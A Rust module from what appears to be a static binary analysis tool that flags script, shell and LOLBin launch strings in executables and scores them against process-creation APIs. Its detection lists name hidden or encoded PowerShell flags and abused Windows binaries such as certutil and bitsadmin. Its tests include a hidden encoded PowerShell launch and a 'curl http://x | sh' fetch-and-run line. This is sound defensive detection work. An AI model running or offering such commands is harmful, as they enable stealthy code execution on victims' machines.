//! Static script / shell / LOLBin launch indicators from plaintext strings.
//!
//! This cannot prove a process was spawned — only that launch-related
//! command lines or interpreters appear in the image, optionally correlated
//! with process-creation APIs.

use super::capabilities::CapabilityTag;
use super::{api_matches, ascii_runs, utf16le_runs, BehaviorMatch};

/// A distinctive launch-related string hit.
#[derive(Debug, Clone)]
pub struct ScriptHit {
    pub family: ScriptFamily,
    pub strength: Strength,
    pub evidence: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum ScriptFamily {
    PowerShell,
    Cmd,
    UnixShell,
    ScriptHost,
    Lolbin,
}

impl ScriptFamily {
    pub fn label(self) -> &'static str {
        match self {
            Self::PowerShell => "powershell",
            Self::Cmd => "cmd",
            Self::UnixShell => "unix_shell",
            Self::ScriptHost => "script_host",
            Self::Lolbin => "lolbin",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Strength {
    Medium = 1,
    Strong = 2,
}

/// True when the IAT (or folded API names) includes a process-creation API.
pub fn has_exec_api(apis: &[String]) -> bool {
    const EXEC: &[&str] = &[
        "CreateProcess",
        "CreateProcessAsUser",
        "CreateProcessWithLogon",
        "CreateProcessWithToken",
        "WinExec",
        "ShellExecute",
        "ShellExecuteEx",
        "NtCreateUserProcess",
        "ZwCreateUserProcess",
        "system",
        "execl",
        "execv",
        "execve",
        "execvp",
        "posix_spawn",
        "fork",
    ];
    EXEC.iter().any(|n| apis.iter().any(|a| api_matches(a, n)))
}

/// Scan ASCII + UTF-16LE strings for shell / script / LOLBin launch markers.
pub fn harvest_script_strings(data: &[u8]) -> Vec<ScriptHit> {
    let window = &data[..data.len().min(4 * 1024 * 1024)];
    let mut hits = Vec::new();
    for s in ascii_runs(window, 4) {
        classify_script_string(&s, &mut hits);
    }
    for s in utf16le_runs(window, 4) {
        classify_script_string(&s, &mut hits);
    }
    dedupe_hits(hits)
}

fn classify_script_string(s: &str, out: &mut Vec<ScriptHit>) {
    let lower = s.to_ascii_lowercase();
    // Skip huge dumps / noise.
    if lower.len() > 240 {
        return;
    }

    // PowerShell — strong encodings / invocation first.
    if lower.contains("powershell") || lower.contains("pwsh") {
        let strong = lower.contains("-enc")
            || lower.contains("-encodedcommand")
            || lower.contains("invoke-expression")
            || lower.contains("iex ")
            || lower.contains("iex(")
            || lower.contains("bypass")
            || lower.contains("powershell.exe")
            || lower.contains("pwsh.exe")
            || lower.contains("-nop")
            || lower.contains("-w hidden")
            || lower.contains("-windowstyle");
        out.push(ScriptHit {
            family: ScriptFamily::PowerShell,
            strength: if strong {
                Strength::Strong
            } else {
                Strength::Medium
            },
            evidence: truncate(s, 72),
        });
    }

    // cmd.exe
    if lower.contains("cmd.exe")
        || lower.contains("cmd /c")
        || lower.contains("cmd.exe /c")
        || lower.contains("cmd /k")
    {
        let strong = lower.contains("/c") || lower.contains("cmd.exe");
        out.push(ScriptHit {
            family: ScriptFamily::Cmd,
            strength: if strong {
                Strength::Strong
            } else {
                Strength::Medium
            },
            evidence: truncate(s, 72),
        });
    }

    // Unix shells
    if lower.contains("/bin/bash")
        || lower.contains("/bin/sh")
        || lower.contains("/bin/zsh")
        || lower.contains("bash -c")
        || lower.contains("sh -c")
        || lower.contains("/usr/bin/env bash")
    {
        out.push(ScriptHit {
            family: ScriptFamily::UnixShell,
            strength: Strength::Strong,
            evidence: truncate(s, 72),
        });
    } else if lower == "bash" || lower.ends_with("/bash") {
        out.push(ScriptHit {
            family: ScriptFamily::UnixShell,
            strength: Strength::Medium,
            evidence: truncate(s, 72),
        });
    }

    // Windows script hosts + script file types
    if lower.contains("wscript")
        || lower.contains("cscript")
        || lower.contains("mshta.exe")
        || lower.ends_with(".ps1")
        || lower.ends_with(".vbs")
        || lower.ends_with(".js")
        || lower.contains(".ps1 ")
        || lower.contains(".bat ")
        || lower.ends_with(".bat")
        || lower.ends_with(".cmd")
        || lower.ends_with(".sh")
    {
        let strong = lower.contains("wscript")
            || lower.contains("cscript")
            || lower.contains("mshta")
            || lower.ends_with(".ps1")
            || lower.contains(".ps1");
        out.push(ScriptHit {
            family: ScriptFamily::ScriptHost,
            strength: if strong {
                Strength::Strong
            } else {
                Strength::Medium
            },
            evidence: truncate(s, 72),
        });
    }

    // Living-off-the-land binaries often used as process spawn targets.
    const LOLBINS: &[&str] = &[
        "rundll32",
        "regsvr32",
        "msiexec",
        "certutil",
        "bitsadmin",
        "installutil",
        "msbuild",
        "cmstp",
        "control.exe",
    ];
    for bin in LOLBINS {
        if lower.contains(bin) {
            out.push(ScriptHit {
                family: ScriptFamily::Lolbin,
                strength: Strength::Medium,
                evidence: truncate(s, 72),
            });
            break;
        }
    }
}

fn dedupe_hits(mut hits: Vec<ScriptHit>) -> Vec<ScriptHit> {
    hits.sort_by(|a, b| {
        b.strength
            .cmp(&a.strength)
            .then(a.family.label().cmp(b.family.label()))
            .then(a.evidence.cmp(&b.evidence))
    });
    // Key by family + evidence so one command line can count for both
    // `cmd` and `powershell` when nested (`cmd /c powershell …`).
    let mut seen = std::collections::BTreeSet::new();
    hits.retain(|h| {
        seen.insert((h.family, h.evidence.to_ascii_lowercase()))
    });
    hits.truncate(12);
    hits
}

/// Build a `script_exec` capability when launch strings are present.
pub fn script_capability(hits: &[ScriptHit], has_exec: bool) -> Option<CapabilityTag> {
    if hits.is_empty() {
        return None;
    }
    let families: std::collections::BTreeSet<_> = hits.iter().map(|h| h.family).collect();
    let strong_n = hits.iter().filter(|h| h.strength == Strength::Strong).count();
    // Lone medium LOLBin string without exec API is too weak (false positives).
    if !has_exec && strong_n == 0 && families.len() < 2 {
        let only_lolbin = families.len() == 1 && families.contains(&ScriptFamily::Lolbin);
        if only_lolbin {
            return None;
        }
    }

    let mut confidence: u8 = if strong_n > 0 { 62 } else { 48 };
    confidence = confidence.saturating_add(((families.len().min(3) - 1) as u8).saturating_mul(8));
    if has_exec {
        confidence = confidence.saturating_add(18);
    }
    if strong_n >= 2 {
        confidence = confidence.saturating_add(8);
    }
    confidence = confidence.min(96);

    let mut evidence: Vec<String> = hits
        .iter()
        .take(6)
        .map(|h| format!("{}: {}", h.family.label(), h.evidence))
        .collect();
    if has_exec {
        evidence.insert(0, "process-creation API present".into());
    }

    Some(CapabilityTag {
        id: "script_exec".into(),
        label: "Script / shell launch".into(),
        confidence,
        evidence,
    })
}

/// Behavior when process-creation APIs coincide with shell/script strings.
pub fn script_launch_behavior(hits: &[ScriptHit], apis: &[String]) -> Option<BehaviorMatch> {
    if hits.is_empty() || !has_exec_api(apis) {
        return None;
    }
    let strong_n = hits.iter().filter(|h| h.strength == Strength::Strong).count();
    if strong_n == 0 && hits.len() < 2 {
        return None;
    }
    let matched_apis: Vec<String> = [
        "CreateProcess",
        "WinExec",
        "ShellExecute",
        "ShellExecuteEx",
        "NtCreateUserProcess",
        "system",
        "execl",
        "execv",
        "execve",
        "fork",
        "posix_spawn",
    ]
    .iter()
    .filter_map(|n| apis.iter().find(|a| api_matches(a, n)).cloned())
    .collect();

    let mut matched = matched_apis;
    for h in hits.iter().take(4) {
        matched.push(h.evidence.clone());
    }

    Some(BehaviorMatch {
        name: "script_launch".into(),
        severity: if strong_n > 0 { 68 } else { 58 },
        description: "Process-creation API plus shell/script/LOLBin command strings"
            .into(),
        matched_apis: matched,
    })
}

fn truncate(s: &str, max: usize) -> String {
    let clean: String = s
        .chars()
        .map(|c| if c.is_control() { ' ' } else { c })
        .collect();
    let trimmed = clean.trim();
    if trimmed.chars().count() > max {
        let cut: String = trimmed.chars().take(max.saturating_sub(1)).collect();
        format!("{cut}…")
    } else {
        trimmed.to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_powershell_encoded() {
        let data = b"cmd /c powershell.exe -nop -w hidden -enc SQBFAFgA";
        let hits = harvest_script_strings(data);
        assert!(hits.iter().any(|h| h.family == ScriptFamily::PowerShell));
        assert!(hits.iter().any(|h| h.strength == Strength::Strong));
        assert!(hits.iter().any(|h| h.family == ScriptFamily::Cmd));
    }

    #[test]
    fn detects_unix_shell() {
        let data = b"/bin/bash -c 'curl http://x | sh'";
        let hits = harvest_script_strings(data);
        assert!(hits.iter().any(|h| h.family == ScriptFamily::UnixShell));
    }

    #[test]
    fn capability_requires_exec_for_lone_lolbin() {
        let hits = harvest_script_strings(b"rundll32.exe javascript:");
        assert!(script_capability(&hits, false).is_none());
        assert!(script_capability(&hits, true).is_some());
    }

    #[test]
    fn behavior_needs_exec_api() {
        let hits = harvest_script_strings(b"powershell.exe -enc AAA");
        let apis = vec!["CreateProcessA".into()];
        assert!(script_launch_behavior(&hits, &apis).is_some());
        assert!(script_launch_behavior(&hits, &[]).is_none());
    }

    #[test]
    fn utf16_powershell() {
        let mut data = Vec::new();
        for c in "powershell.exe".encode_utf16() {
            data.extend_from_slice(&c.to_le_bytes());
        }
        let hits = harvest_script_strings(&data);
        assert!(hits.iter().any(|h| h.family == ScriptFamily::PowerShell));
    }
}
